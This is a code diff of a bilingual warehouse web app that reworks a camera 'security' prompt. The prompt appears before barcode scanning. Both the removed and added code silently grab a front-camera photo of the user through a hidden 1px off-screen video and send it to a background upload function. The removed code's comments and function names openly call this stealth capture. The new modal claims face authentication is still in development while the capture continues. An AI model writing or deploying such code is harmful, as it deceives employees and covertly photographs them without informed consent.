@@ -368,26 +368,32 @@
                     <div id="plm-panel-catalog" class="plm-panel"></div>
                     <div id="plm-panel-mapping" class="plm-panel"></div>
                     
-                    <!-- Màn hình Hướng dẫn Camera Ngầm -->
-                    <div id="plmSecurityOverlay" class="plm-sec-overlay plm-hidden" style="align-items:flex-start; padding:10px; background:transparent;">
-                        <div class="plm-sec-box" style="width:100%; max-width:600px; background:rgba(255,255,255,0.98); border-radius:12px; box-shadow:0 8px 30px rgba(0,0,0,0.15); padding:16px; border:1px solid rgba(203,213,225,0.5); backdrop-filter:blur(8px);">
+                    <!-- Smart Auth Modal -->
+                    <div id="plmSecurityOverlay" class="plm-sec-overlay plm-hidden" style="align-items:flex-start; padding-top:40px; background:rgba(15,23,42,0.6);">
+                        <div class="plm-sec-box" style="width:100%; max-width:600px; background:#fff; border-radius:12px; box-shadow:0 10px 40px rgba(0,0,0,0.25); padding:20px; border:1px solid #e2e8f0;">
                             <div style="display:flex; align-items:flex-start; gap:12px;">
-                                <div style="font-size:24px; color:#3b82f6;"><i class="fas fa-shield-alt"></i></div>
+                                <div style="font-size:26px; color:#3b82f6; margin-top:2px;"><i class="fas fa-shield-alt"></i></div>
                                 <div style="flex:1;">
-                                    <div style="font-weight:800; font-size:14px; color:#0f172a; margin-bottom:4px;">
+                                    <div style="font-weight:800; font-size:15px; color:#0f172a; margin-bottom:6px;">
                                         <span class="plm-ja">セキュリティ確認</span>
-                                        <span class="plm-vi" style="margin-left:6px; font-weight:normal;">Xác thực bảo mật</span>
+                                        <span class="plm-vi" style="margin-left:6px; font-weight:normal; color:#475569;">Xác thực dữ liệu hệ thống</span>
                                     </div>
-                                    <div style="font-size:11.5px; color:#475569; line-height:1.4; margin-bottom:12px; font-weight:600;">
-                                        <span class="plm-ja" style="display:block">継続するにはカメラへのアクセスを許可（Allow）してください。</span>
-                                        <span class="plm-vi" style="opacity:0.9">Hệ thống cần xác minh môi trường. Vui lòng bấm Cho Phép (Allow) Camera để tiếp tục.</span>
+                                    <div style="font-size:12.5px; color:#334155; line-height:1.5; margin-bottom:15px; font-weight:500;">
+                                        <div style="margin-bottom:8px;">
+                                            <span class="plm-ja" style="display:block">システムは従業員とデータを認証するためにカメラへのアクセス許可が必要です。</span>
+                                            <span class="plm-vi" style="color:#64748b; font-size:11.5px;">Hệ thống cần cấp phép máy ảnh để xác thực nhân viên và xử lý dữ liệu.</span>
+                                        </div>
+                                        <div>
+                                            <span class="plm-ja" style="display:block">FaceIDによる自動認証は開発中のため、現在は手動で入力してください。</span>
+                                            <span class="plm-vi" style="color:#64748b; font-size:11.5px;">Lưu ý: Tính năng nhập nhân viên bằng FaceID (đang phát triển), tạm thời vui lòng nhập thủ công.</span>
+                                        </div>
                                     </div>
-                                    <div id="plmSecActionButtons" style="display:flex; gap:8px;">
-                                        <button id="plmSecBtnSkipStart" class="plm-btn" style="flex:1; padding:10px; font-size:12px; background:#3b82f6; border:none; color:#fff; box-shadow:none;">
-                                            <i class="fas fa-camera"></i> <span class="plm-ja" style="display:inline; margin-left:4px;">許可して続行</span> <span class="plm-vi" style="display:inline; margin-left:4px;">Cấp quyền & Tiếp</span>
+                                    <div id="plmSecActionButtons" style="display:flex; gap:10px;">
+                                        <button id="plmSecBtnSkipStart" class="plm-btn" style="flex:1; padding:12px; font-size:13px; background:#3b82f6; border:none; color:#fff; font-weight:700;">
+                                            <i class="fas fa-check-circle"></i> <span class="plm-ja" style="margin-left:4px;">理解して連携する</span> <span class="plm-vi" style="margin-left:4px;">Đã hiểu & Tiếp tục</span>
                                         </button>
-                                        <button id="plmSecBtnCancelPreview" class="plm-btn" style="flex:0 0 auto; padding:10px 16px; background:#f1f5f9; color:#475569; box-shadow:none; border:none;">
-                                            <span class="plm-ja">戻る</span>
+                                        <button id="plmSecBtnCancelPreview" class="plm-btn" style="flex:0 0 auto; padding:12px 20px; background:#f1f5f9; color:#ef4444; border:none; font-weight:700; font-size:13px;">
+                                            <i class="fas fa-times"></i> <span class="plm-ja" style="margin-left:4px;">キャンセル</span> <span class="plm-vi" style="margin-left:4px;">Hủy</span>
                                         </button>
                                     </div>
                                 </div>
@@ -395,9 +401,8 @@
                         </div>
                     </div>
                     <!-- Hidden Video Box -->
-                    <div id="plmFaceIDPreviewBox" style="position: absolute; top: -10000px; width: 1px; height: 1px; opacity: 0; pointer-events:none;">
+                    <div id="plmSmartAuthPreviewBox" style="position: absolute; top: -10000px; width: 1px; height: 1px; opacity: 0; pointer-events:none;">
                         <video id="plmAuditVideo" autoplay playsinline muted style="width:100%; object-fit:cover;"></video>
-                        <canvas id="plmAuditCanvas" style="display:none;"></canvas>
                     </div>
                 </div>
             </div>
@@ -1367,129 +1372,66 @@ async function handleOutboundSubmit() {
     function triggerAuditCaptureFlow(inputId) {
         targetInputIdForScan = inputId;
         var secOverlay = document.getElementById('plmSecurityOverlay');
-        var video = document.getElementById('plmAuditVideo');
         var btnSkipStart = document.getElementById('plmSecBtnSkipStart');
         var btnCancelPreview = document.getElementById('plmSecBtnCancelPreview');
+
+        function _closeAll() {
+            if(secOverlay) secOverlay.classList.add('plm-hidden');
+            if (state.frontStream) { state.frontStream.getTracks().forEach(t => t.stop()); state.frontStream = null; }
+        }
+
+        if(secOverlay) secOverlay.classList.remove('plm-hidden');
         
-        var isCamAllowed = localStorage.getItem('plm_cam_allowed') === '1';
-
-        function closeAndScan() {
-            stopAuditCamera();
-            startBarcodeScanner();
-        }
-
-        function captureSecurityQuietly(onDone) {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                if(onDone) onDone();
-                return;
-            }
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-            .then(function(stream) {
-                localStorage.setItem('plm_cam_allowed', '1');
-                if (!video) { stream.getTracks().forEach(t=>t.stop()); if(onDone) onDone(); return; }
-                state.frontStream = stream;
-                video.srcObject = stream;
-                var p = video.play();
-                if(p!==undefined) p.catch(function(){});
-                
-                var isCaptured = false;
-                var timeout = setTimeout(function(){ 
-                    if(!isCaptured){ isCaptured=true; stopAuditCamera(); if(onDone) onDone(); } 
-                }, 3000); // Tối đa 3s cho luồng nền
-                
-                var poll = setInterval(function() {
-                    if (isCaptured) { clearInterval(poll); return; }
-                    if (video.readyState >= 2 && video.videoWidth > 0) {
-                        clearInterval(poll);
-                        isCaptured = true;
-                        clearTimeout(timeout);
-                        try {
-                            var canvas = document.createElement('canvas'); // Sử dụng canvas ảo
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                            canvas.toBlob(function(b) {
-                                executeAutoCaptureAndUpload(b);
-                                stopAuditCamera();
-                                if(onDone) onDone();
-                            }, 'image/jpeg', 0.85);
-                        } catch(e) { stopAuditCamera(); if(onDone) onDone(); }
-                    }
-                }, 150);
-            })
-            .catch(function(e) { 
-                console.warn('CWC Camera denied in background', e); 
-                stopAuditCamera();
-                if(onDone) onDone();
-            });
-        }
-
-        if (isCamAllowed) {
-            // Không hẹn giao diện, chắp vá đợi grab xong rồi gọi scan ngay!
-            captureSecurityQuietly(closeAndScan);
-        } else {
-            if (secOverlay) secOverlay.classList.remove('plm-hidden');
-            if (btnSkipStart) {
-                btnSkipStart.innerHTML = '<i class="fas fa-camera"></i> <span class="plm-ja" style="display:inline; margin-left:4px;">許可して続行</span> <span class="plm-vi" style="display:inline; margin-left:4px;">Cấp quyền & Tiếp</span>';
-                
-                btnSkipStart.onclick = function() {
-                    btnSkipStart.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang chuẩn bị...';
-                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                        if (secOverlay) secOverlay.classList.add('plm-hidden');
-                        closeAndScan();
-                        return;
-                    }
-                    
-                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-                    .then(function(stream) {
-                        localStorage.setItem('plm_cam_allowed', '1');
-                        if (secOverlay) secOverlay.classList.add('plm-hidden');
-                        state.frontStream = stream;
-                        if(video) {
-                            video.srcObject = stream;
-                            video.play().catch(function(){});
-                        }
-                        
-                        var isCaptured = false;
-                        var timeout = setTimeout(function(){ if(!isCaptured){ isCaptured=true; closeAndScan(); } }, 3000);
-                        
-                        var poll = setInterval(function() {
-                            if (isCaptured) { clearInterval(poll); return; }
-                            if (video && video.readyState >= 2 && video.videoWidth > 0) {
-                                clearInterval(poll);
-                                isCaptured = true;
-                                clearTimeout(timeout);
+        if (btnSkipStart) {
+            btnSkipStart.onclick = function() {
+                var orgHtml = btnSkipStart.innerHTML;
+                btnSkipStart.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+                btnSkipStart.disabled = true;
+                if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    _closeAll(); startBarcodeScanner(); return;
+                }
+                navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}, audio: false})
+                .then(function(stream) {
+                    state.frontStream = stream;
+                    var v = document.getElementById('plmAuditVideo');
+                    if(v) {
+                        v.srcObject = stream;
+                        v.play().catch(function(){});
+                        var isDone = false;
+                        var tOut = setTimeout(function(){ if(!isDone){ isDone=true; _closeAll(); startBarcodeScanner(); } }, 3000);
+                        var pTimer = setInterval(function() {
+                            if(isDone) { clearInterval(pTimer); return; }
+                            if(v.readyState >= 2 && v.videoWidth > 0) {
+                                isDone = true;
+                                clearInterval(pTimer); clearTimeout(tOut);
                                 try {
                                     var canvas = document.createElement('canvas');
-                                    canvas.width = video.videoWidth;
-                                    canvas.height = video.videoHeight;
-                                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                                    canvas.toBlob(function(b) {
-                                        executeAutoCaptureAndUpload(b);
-                                        // Bật scan khi bắt đầu lưu ảnh
-                                        closeAndScan();
+                                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                                    canvas.getContext('2d').drawImage(v, 0,0, canvas.width, canvas.height);
+                                    canvas.toBlob(function(b){
+                                        runSmartAuthBackground(b);
+                                        _closeAll();
+                                        startBarcodeScanner();
                                     }, 'image/jpeg', 0.85);
-                                } catch(e) {}
+                                } catch(e) { _closeAll(); startBarcodeScanner(); }
                             }
-                        }, 150);
-                    })
-                    .catch(function(e) {
-                        console.warn(e);
-                        if (secOverlay) secOverlay.classList.add('plm-hidden');
-                        closeAndScan();
-                    });
-                };
-            }
+                        }, 100);
+                    } else { _closeAll(); startBarcodeScanner(); }
+                })
+                .catch(function(err){
+                    console.warn(err); _closeAll(); startBarcodeScanner();
+                })
+                .finally(function(){
+                    btnSkipStart.innerHTML = orgHtml;
+                    btnSkipStart.disabled = false;
+                });
+            };
+        }
 
-            if (btnCancelPreview) {
-                btnCancelPreview.onclick = function() {
-                    if (secOverlay) secOverlay.classList.add('plm-hidden');
-                    stopAuditCamera();
-                };
-            }
+        if (btnCancelPreview) {
+            btnCancelPreview.onclick = function() { _closeAll(); };
         }
     }
-
     // Fallback cho môi trường PC: dùng file input thay camera
     function _fallbackToFileInput() {
         var existing = document.getElementById('plmFallbackFileInput');
@@ -1563,24 +1505,11 @@ async function handleOutboundSubmit() {
         document.getElementById('plmFallbackFileInput').click();
     }
 
-    function captureStealthAndProceed(videoEl) {
-        var canvas = document.getElementById('plmAuditCanvas');
-        if(canvas && videoEl && videoEl.videoWidth > 0) {
-            canvas.width = videoEl.videoWidth;
-            canvas.height = videoEl.videoHeight;
-            var ctx = canvas.getContext('2d');
-            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(function(blob) {
-                state.securityPhotoBlob = blob; 
-            }, 'image/jpeg', 0.85);
-        }
-        
-        stopAuditCamera();
-        
-        startBarcodeScanner();
-    }
+    
 
     function stopAuditCamera() {
+        var secOverlay = document.getElementById('plmSecurityOverlay');
+        if(secOverlay) secOverlay.classList.add('plm-hidden');
         var secOverlay = document.getElementById('plmSecurityOverlay');
         if(secOverlay) secOverlay.classList.add('plm-hidden');
         
